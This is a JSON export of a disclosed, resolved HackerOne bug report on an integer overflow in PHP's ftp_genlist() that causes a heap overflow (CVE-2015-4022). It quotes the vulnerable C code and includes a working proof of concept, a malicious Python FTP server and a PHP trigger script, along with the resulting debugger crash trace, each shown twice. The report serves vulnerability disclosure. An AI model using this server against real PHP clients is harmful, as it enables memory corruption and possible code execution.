{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 73240, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-05-12T00:00:00.000Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Integer overflow in ftp_genlist() resulting in heap overflow", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [
        "CVE-2015-4022"
    ], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "reporter": {
                "username": "ruben", 
                "url": "/ruben"
            }, 
            "created_at": "2015-05-12T00:00:00.000Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-15T13:29:45.799Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1196217, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-30T11:35:51.674Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-30T11:35:51.674Z", 
            "actor": {
                "url": "/ibb-php", 
                "profile": {
                    "name": "PHP (IBB)"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
                }
            }, 
            "team_handle": "ibb-php", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "ruben", 
                "url": "/ruben"
            }, 
            "message": null, 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 496240, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "ruben", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ruben", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2015-05-12T00:00:00.000Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/73240", 
    "created_at": "2015-04-28T00:00:00.000Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p><a title=\"https://bugs.php.net/bug.php?id=69545\" href=\"/redirect?signature=61eacd0c1cd9b6984a6b60c6751d70bb00a423b7&amp;url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69545\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://bugs.php.net/bug.php?id=69545</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"description\">Description:</h2>\n\n<p>The ftp_genlist() function of the ftp extension is prone to an integer overflow, which may result in remote code execution.</p>\n<pre class=\"highlight plaintext\"><code>ext/ftp/ftp.c:ftp_genlist(...)\n1826         size = 0;\n1827         lines = 0;\n1828         lastch = 0;\n1829         while ((rcvd = my_recv(ftp, data-&gt;fd, data-&gt;buf, FTP_BUFSIZE))) {\n1830                 if (rcvd == -1) {\n1831                         goto bail;\n1832                 }\n1833\n1834                 php_stream_write(tmpstream, data-&gt;buf, rcvd);\n1835\n1836                 size += rcvd;\n1837                 for (ptr = data-&gt;buf; rcvd; rcvd--, ptr++) {\n1838                         if (*ptr == &#39;\\n&#39; &amp;&amp; lastch == &#39;\\r&#39;) {\n1839                                 lines++; // [0]\n1840                         } else {\n1841                                 size++; // [1]\n1842                         }\n1843                         lastch = *ptr;\n1844                 }\n1845         }\n</code></pre>\n<p>In the above loop <code>size&#39; or</code>lines&#39; may overflow (at [0] respectively [1]).<br>\nThis requires sending more than 2^32 bytes, which will be stored in a tempfile.</p>\n<pre class=\"highlight plaintext\"><code>1851         ret = safe_emalloc((lines + 1), sizeof(char*), size); // [2]\n1852\n1853         entry = ret;\n1854         text = (char*) (ret + lines + 1);\n1855         *entry = text;\n1856         lastch = 0;\n1857         while ((ch = php_stream_getc(tmpstream)) != EOF) {\n1858                 if (ch == &#39;\\n&#39; &amp;&amp; lastch == &#39;\\r&#39;) {\n1859                         *(text - 1) = 0;\n1860                         *++entry = text;\n1861                 } else {\n1862                         *text++ = ch; // [3]\n1863                 }\n1864                 lastch = ch;\n1865         }\n1866         *entry = NULL;\n</code></pre>\n<p>This results in the allocated buffer at [2] being to small to hold the data written to<br>\nthe tempfile, which results in a heap overflow at [3] when loading the contents of the<br>\ntempfile back into memory.</p>\n\n<p>These kind of bugs are well-known to be exploitable and since php_stream_getc uses structs<br>\nlocated on the heap, which may be overwritten, I think that this bug can be leveraged to attain<br>\nremote code execution.</p>\n\n<p>Regards,<br>\nMax Spelsberg</p>\n<pre class=\"highlight plaintext\"><code>malicious_server.py\n===================\n#!/usr/bin/env python2\n# coding: utf-8\n\n# based on https://gist.github.com/scturtle/1035886\n\nimport os,socket,threading,time\n\nallow_delete = False\nlocal_ip = &quot;localhost&quot;\nlocal_port = 8887\ncurrdir=os.path.abspath(&#39;.&#39;)\n\nclass FTPserverThread(threading.Thread):\n    def __init__(self,(conn,addr)):\n        self.conn=conn\n        self.addr=addr\n        self.basewd=currdir\n        self.cwd=self.basewd\n        self.rest=False\n        self.pasv_mode=False\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.conn.send(&#39;220 Welcome!\\r\\n&#39;)\n        while True:\n            cmd=self.conn.recv(256)\n            if not cmd: break\n            else:\n                print &#39;Recieved:&#39;,cmd\n                try:\n                    func=getattr(self,cmd[:4].strip().upper())\n                    func(cmd)\n                except Exception,e:\n                    print &#39;ERROR:&#39;,e\n                    #traceback.print_exc()\n                    self.conn.send(&#39;500 Sorry.\\r\\n&#39;)\n            self.conn.close()\n\n    def TYPE(self,cmd):\n        self.mode=cmd[5]\n        self.conn.send(&#39;200 Binary mode.\\r\\n&#39;)\n\n    def PASV(self,cmd): # from http://goo.gl/3if2U\n        self.pasv_mode = True\n        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        self.servsock.bind((local_ip,0))\n        self.servsock.listen(1)\n        ip, port = self.servsock.getsockname()\n        print &#39;open&#39;, ip, port\n        self.conn.send(&#39;227 Entering Passive Mode (%s,%u,%u).\\r\\n&#39; %\n                (&#39;,&#39;.join(ip.split(&#39;.&#39;)), port&gt;&gt;8&amp;0xFF, port&amp;0xFF))\n\n    def start_datasock(self):\n        if self.pasv_mode:\n            self.datasock, addr = self.servsock.accept()\n            print &#39;connect:&#39;, addr\n        else:\n            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n            self.datasock.connect((self.dataAddr,self.dataPort))\n\n    def stop_datasock(self):\n        self.datasock.close()\n        if self.pasv_mode:\n            self.servsock.close()\n\n    # THIS is the interesting part    \n    def LIST(self,cmd):\n        self.conn.send(&#39;150 Here comes the directory listing.\\r\\n&#39;)\n        print &#39;list:&#39;, self.cwd\n        self.start_datasock()\n\n        # send 2^32 + 1 bytes of data\n        for i in xrange(262144):\n            if i % 10000 == 0:\n                print &quot;%d&quot; % i\n            self.datasock.send(&quot;B&quot;*16384)\n        self.datasock.send(&quot;A\\r\\n&quot;)\n\n        self.stop_datasock()\n        self.conn.send(&#39;226 Directory send OK.\\r\\n&#39;)\n\n\nclass FTPserver(threading.Thread):\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.bind((local_ip,local_port))\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.sock.listen(5)\n        while True:\n            th=FTPserverThread(self.sock.accept())\n            th.daemon=True\n            th.start()\n\n    def stop(self):\n        self.sock.close()\n\nif __name__==&#39;__main__&#39;:\n    ftp=FTPserver()\n    ftp.daemon=True\n    ftp.start()\n    print &#39;On&#39;, local_ip, &#39;:&#39;, local_port\n    raw_input(&#39;Enter to end...\\n&#39;)\n    ftp.stop()\n</code></pre><pre class=\"highlight plaintext\"><code>buggy.php\n=========\n&lt;?php\n    $id = ftp_connect(&quot;localhost&quot;, 8887);\n    ftp_pasv($id, TRUE);\n    var_dump(ftp_rawlist($id, &quot;/&quot;));\n?&gt;\n</code></pre><pre class=\"highlight plaintext\"><code>Result\n======\n(lldb) r ./buggy.php\nProcess 54712 launched: &#39;/usr/bin/php&#39; (x86_64)\nProcess 54712 stopped\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n    frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\nlibsystem_platform.dylib`_platform_memmove$VARIANT$Unknown:\n-&gt;  0x7fff86503056 &lt;+182&gt;: movb   (%rsi,%r8), %cl\n    0x7fff8650305a &lt;+186&gt;: movb   %cl, (%rdi,%r8)\n    0x7fff8650305e &lt;+190&gt;: subq   $0x1, %rdx\n    0x7fff86503062 &lt;+194&gt;: je     0x7fff86503078            ; &lt;+216&gt;\n(lldb) register read rsi\n     rsi = 0x00000001024243de\n(lldb) bt\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = &#39;com.apple.main-thread&#39;, stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n  * frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\n    frame #1: 0x000000010031b2c7 php`_php_stream_read + 81\n    frame #2: 0x000000010031b8a1 php`_php_stream_getc + 22\n    frame #3: 0x000000010010ec3a php`___lldb_unnamed_function2574$$php + 614\n    frame #4: 0x000000010010c21c php`___lldb_unnamed_function2530$$php + 118\n    frame #5: 0x00000001003cb2af php`___lldb_unnamed_function9391$$php + 1752\n    frame #6: 0x00000001003813b0 php`execute_ex + 79\n    frame #7: 0x000000010035d592 php`zend_execute_scripts + 482\n    frame #8: 0x0000000100308897 php`php_execute_script + 684\n    frame #9: 0x00000001003edce0 php`___lldb_unnamed_function9505$$php + 4653\n    frame #10: 0x00000001003ec93c php`___lldb_unnamed_function9503$$php + 1408\n    frame #11: 0x00007fff8cb8d5c9 libdyld.dylib`start + 1\n(lldb)\n</code></pre>\n<p>[Note that the first three bytes (42, 43, de) of rsi have been overwritten!]</p>\n", 
    "vulnerability_information": "https://bugs.php.net/bug.php?id=69545\n\nDescription:\n------------\nThe ftp_genlist() function of the ftp extension is prone to an integer overflow, which may result in remote code execution.\n\n```\next/ftp/ftp.c:ftp_genlist(...)\n1826         size = 0;\n1827         lines = 0;\n1828         lastch = 0;\n1829         while ((rcvd = my_recv(ftp, data->fd, data->buf, FTP_BUFSIZE))) {\n1830                 if (rcvd == -1) {\n1831                         goto bail;\n1832                 }\n1833\n1834                 php_stream_write(tmpstream, data->buf, rcvd);\n1835\n1836                 size += rcvd;\n1837                 for (ptr = data->buf; rcvd; rcvd--, ptr++) {\n1838                         if (*ptr == '\\n' && lastch == '\\r') {\n1839                                 lines++; // [0]\n1840                         } else {\n1841                                 size++; // [1]\n1842                         }\n1843                         lastch = *ptr;\n1844                 }\n1845         }\n```\n\nIn the above loop `size' or `lines' may overflow (at [0] respectively [1]).\nThis requires sending more than 2^32 bytes, which will be stored in a tempfile.\n\n```\n1851         ret = safe_emalloc((lines + 1), sizeof(char*), size); // [2]\n1852\n1853         entry = ret;\n1854         text = (char*) (ret + lines + 1);\n1855         *entry = text;\n1856         lastch = 0;\n1857         while ((ch = php_stream_getc(tmpstream)) != EOF) {\n1858                 if (ch == '\\n' && lastch == '\\r') {\n1859                         *(text - 1) = 0;\n1860                         *++entry = text;\n1861                 } else {\n1862                         *text++ = ch; // [3]\n1863                 }\n1864                 lastch = ch;\n1865         }\n1866         *entry = NULL;\n```\n\nThis results in the allocated buffer at [2] being to small to hold the data written to\nthe tempfile, which results in a heap overflow at [3] when loading the contents of the\ntempfile back into memory.\n\nThese kind of bugs are well-known to be exploitable and since php_stream_getc uses structs\nlocated on the heap, which may be overwritten, I think that this bug can be leveraged to attain\nremote code execution.\n\nRegards,\nMax Spelsberg\n\n\n```\nmalicious_server.py\n===================\n#!/usr/bin/env python2\n# coding: utf-8\n\n# based on https://gist.github.com/scturtle/1035886\n\nimport os,socket,threading,time\n\nallow_delete = False\nlocal_ip = \"localhost\"\nlocal_port = 8887\ncurrdir=os.path.abspath('.')\n\nclass FTPserverThread(threading.Thread):\n    def __init__(self,(conn,addr)):\n        self.conn=conn\n        self.addr=addr\n        self.basewd=currdir\n        self.cwd=self.basewd\n        self.rest=False\n        self.pasv_mode=False\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.conn.send('220 Welcome!\\r\\n')\n        while True:\n            cmd=self.conn.recv(256)\n            if not cmd: break\n            else:\n                print 'Recieved:',cmd\n                try:\n                    func=getattr(self,cmd[:4].strip().upper())\n                    func(cmd)\n                except Exception,e:\n                    print 'ERROR:',e\n                    #traceback.print_exc()\n                    self.conn.send('500 Sorry.\\r\\n')\n            self.conn.close()\n\n    def TYPE(self,cmd):\n        self.mode=cmd[5]\n        self.conn.send('200 Binary mode.\\r\\n')\n\n    def PASV(self,cmd): # from http://goo.gl/3if2U\n        self.pasv_mode = True\n        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        self.servsock.bind((local_ip,0))\n        self.servsock.listen(1)\n        ip, port = self.servsock.getsockname()\n        print 'open', ip, port\n        self.conn.send('227 Entering Passive Mode (%s,%u,%u).\\r\\n' %\n                (','.join(ip.split('.')), port>>8&0xFF, port&0xFF))\n\n    def start_datasock(self):\n        if self.pasv_mode:\n            self.datasock, addr = self.servsock.accept()\n            print 'connect:', addr\n        else:\n            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n            self.datasock.connect((self.dataAddr,self.dataPort))\n\n    def stop_datasock(self):\n        self.datasock.close()\n        if self.pasv_mode:\n            self.servsock.close()\n\n    # THIS is the interesting part    \n    def LIST(self,cmd):\n        self.conn.send('150 Here comes the directory listing.\\r\\n')\n        print 'list:', self.cwd\n        self.start_datasock()\n\n        # send 2^32 + 1 bytes of data\n        for i in xrange(262144):\n            if i % 10000 == 0:\n                print \"%d\" % i\n            self.datasock.send(\"B\"*16384)\n        self.datasock.send(\"A\\r\\n\")\n\n        self.stop_datasock()\n        self.conn.send('226 Directory send OK.\\r\\n')\n\n\nclass FTPserver(threading.Thread):\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.bind((local_ip,local_port))\n        threading.Thread.__init__(self)\n\n    def run(self):\n        self.sock.listen(5)\n        while True:\n            th=FTPserverThread(self.sock.accept())\n            th.daemon=True\n            th.start()\n\n    def stop(self):\n        self.sock.close()\n\nif __name__=='__main__':\n    ftp=FTPserver()\n    ftp.daemon=True\n    ftp.start()\n    print 'On', local_ip, ':', local_port\n    raw_input('Enter to end...\\n')\n    ftp.stop()\n```\n\n```\nbuggy.php\n=========\n<?php\n    $id = ftp_connect(\"localhost\", 8887);\n    ftp_pasv($id, TRUE);\n    var_dump(ftp_rawlist($id, \"/\"));\n?>\n```\n\n\n```\nResult\n======\n(lldb) r ./buggy.php\nProcess 54712 launched: '/usr/bin/php' (x86_64)\nProcess 54712 stopped\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n    frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\nlibsystem_platform.dylib`_platform_memmove$VARIANT$Unknown:\n->  0x7fff86503056 <+182>: movb   (%rsi,%r8), %cl\n    0x7fff8650305a <+186>: movb   %cl, (%rdi,%r8)\n    0x7fff8650305e <+190>: subq   $0x1, %rdx\n    0x7fff86503062 <+194>: je     0x7fff86503078            ; <+216>\n(lldb) register read rsi\n     rsi = 0x00000001024243de\n(lldb) bt\n* thread #1: tid = 0x204e9, 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1024243de)\n  * frame #0: 0x00007fff86503056 libsystem_platform.dylib`_platform_memmove$VARIANT$Unknown + 182\n    frame #1: 0x000000010031b2c7 php`_php_stream_read + 81\n    frame #2: 0x000000010031b8a1 php`_php_stream_getc + 22\n    frame #3: 0x000000010010ec3a php`___lldb_unnamed_function2574$$php + 614\n    frame #4: 0x000000010010c21c php`___lldb_unnamed_function2530$$php + 118\n    frame #5: 0x00000001003cb2af php`___lldb_unnamed_function9391$$php + 1752\n    frame #6: 0x00000001003813b0 php`execute_ex + 79\n    frame #7: 0x000000010035d592 php`zend_execute_scripts + 482\n    frame #8: 0x0000000100308897 php`php_execute_script + 684\n    frame #9: 0x00000001003edce0 php`___lldb_unnamed_function9505$$php + 4653\n    frame #10: 0x00000001003ec93c php`___lldb_unnamed_function9503$$php + 1408\n    frame #11: 0x00007fff8cb8d5c9 libdyld.dylib`start + 1\n(lldb)\n```\n[Note that the first three bytes (42, 43, de) of rsi have been overwritten!]\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}